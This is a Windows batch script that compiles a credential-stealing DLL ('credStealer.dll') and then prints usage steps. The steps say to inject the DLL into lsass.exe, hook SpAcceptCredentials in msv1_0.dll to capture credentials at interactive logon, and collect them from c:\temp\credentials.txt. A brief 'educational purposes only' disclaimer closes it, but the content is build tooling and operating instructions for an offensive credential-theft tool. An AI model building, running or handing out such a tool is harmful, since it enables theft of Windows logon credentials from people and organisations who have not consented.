@echo off
echo Building Credential Stealer DLL...

REM Check if Visual Studio Developer Command Prompt is available
where cl >nul 2>&1
if %errorlevel% neq 0 (
    echo Visual Studio Developer Command Prompt not found.
    echo Please run this from a Developer Command Prompt or set up the environment.
    echo You can also use: "C:\Program Files (x86)\Microsoft Visual Studio\2019\Community\VC\Auxiliary\Build\vcvars64.bat"
    pause
    exit /b 1
)

REM Compile the DLL
cl /LD credStealer.cpp /Fe:credStealer.dll /link /DEF:credStealer.def

if %errorlevel% equ 0 (
    echo.
    echo [+] Build successful! credStealer.dll created.
    echo.
    echo [*] Usage instructions:
    echo [*] 1. Inject this DLL into lsass.exe process
    echo [*] 2. Monitor c:\temp\credentials.txt for captured credentials
    echo [*] 3. The DLL will hook SpAcceptCredentials in msv1_0.dll
    echo [*] 4. Credentials will be captured during interactive logons
    echo.
    echo [WARNING] This tool is for educational purposes only!
    echo [WARNING] Use only in authorized testing environments!
) else (
    echo.
    echo [-] Build failed!
    echo [-] Check the error messages above.
)

pause 